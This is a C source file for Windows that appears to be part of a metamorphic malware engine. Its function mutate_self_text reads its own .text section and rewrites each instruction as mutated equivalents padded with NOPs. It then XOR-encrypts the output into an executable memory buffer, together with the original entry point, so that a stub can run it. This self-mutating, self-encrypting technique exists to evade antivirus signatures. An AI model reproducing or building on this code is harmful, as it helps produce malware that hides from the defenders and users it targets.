#include <windows.h>
#include <stdint.h>
#include <stddef.h>
#include <string.h>
#include "engine.h"
#include "mutate.h"
#include "isa.h"

#define MAX_INST_SIZE 15
#define MAX_MUTATED    4
#define XOR_KEY        0x5A
#define PAYLOAD_BASE   0x1000   // space for stub + metadata
#define EXTRA_ENGINE_SPACE 0x4000  // Reserve space for engine_entry()


void xor_encrypt(uint8_t* data, size_t len, uint8_t key) {
    for (size_t i = 0; i < len; ++i) {
        data[i] ^= key;
    }
}

__declspec(dllexport) uint8_t* __stdcall mutate_self_text(size_t* out_len) {
    // Base of our own module in memory
    uint8_t* base = (uint8_t*)GetModuleHandle(NULL);
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
    IMAGE_SECTION_HEADER* sections = IMAGE_FIRST_SECTION(nt);

    // Locate .text section
    uint8_t* text = NULL;
    DWORD text_size = 0;
    for (int i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        if (memcmp(sections[i].Name, ".text", 5) == 0) {
            text = base + sections[i].VirtualAddress;
            text_size = sections[i].Misc.VirtualSize;
            break;
        }
    }
    if (!text || text_size == 0) {
        return NULL;
    }

    // Allocate blob: stub + metadata + mutated payload (allow up to 2x expansion)
    size_t max_payload = (size_t)text_size * 2;
    size_t blob_size = PAYLOAD_BASE + max_payload + EXTRA_ENGINE_SPACE;
    uint8_t* blob = (uint8_t*)VirtualAlloc(
        NULL,
        blob_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    if (!blob) {
        return NULL;
    }

    // Mutated region follows the stub & metadata
    uint8_t* mutated = blob + PAYLOAD_BASE;
    size_t in_off = 0, out_off = 0;

    // Copy & mutate instructions
    while (in_off < text_size) {
        // Prevent buffer overflow
        if (out_off + MAX_INST_SIZE >= max_payload) {
            // no room left for further mutation
            break;
        }

        struct Instruction inst;
        int decoded = decode_instruction(&text[in_off], &inst);

        if (decoded <= 0 || (in_off + decoded > text_size)) {
            // fallback: copy single byte
            mutated[out_off++] = text[in_off++];
            continue;
        }

        // Try multi-mutation
        struct Instruction mutated_inst[MAX_MUTATED];
        int count = mutate_multi(&inst, mutated_inst, MAX_MUTATED);
        if (count > 0) {
            int written = 0;
            for (int i = 0; i < count; ++i) {
                uint8_t encoded[MAX_INST_SIZE] = { 0 };
                int len = encode_instruction(&mutated_inst[i], encoded);
                memcpy(mutated + out_off, encoded, len);
                out_off += len;
                written += len;
            }
            // pad remaining bytes with NOPs
            int padding = decoded - written;
            if (padding > 0) {
                memset(mutated + out_off, 0x90, padding);
                out_off += padding;
            }
        }
        else {
            // single-op mutation
            mutate_opcode(&inst);
            uint8_t encoded[MAX_INST_SIZE] = { 0 };
            int len = encode_instruction(&inst, encoded);
            memcpy(mutated + out_off, encoded, len);
            out_off += len;
        }

        in_off += decoded;
    }

    // Encrypt the mutated payload in-place
    xor_encrypt(mutated, out_off, XOR_KEY);

    // Write metadata: payload offset, size, and original entry point
    uint64_t runtimeOEP = (uint64_t)base + nt->OptionalHeader.AddressOfEntryPoint;
    *(uint64_t*)(blob + 0x0FE0) = (uint64_t)PAYLOAD_BASE;
    *(uint64_t*)(blob + 0x0FE8) = (uint64_t)out_off;
    *(uint64_t*)(blob + 0x0FF0) = runtimeOEP;

    // Return total size: stub + metadata + encrypted payload
    *out_len = PAYLOAD_BASE + out_off;



    return blob;
}
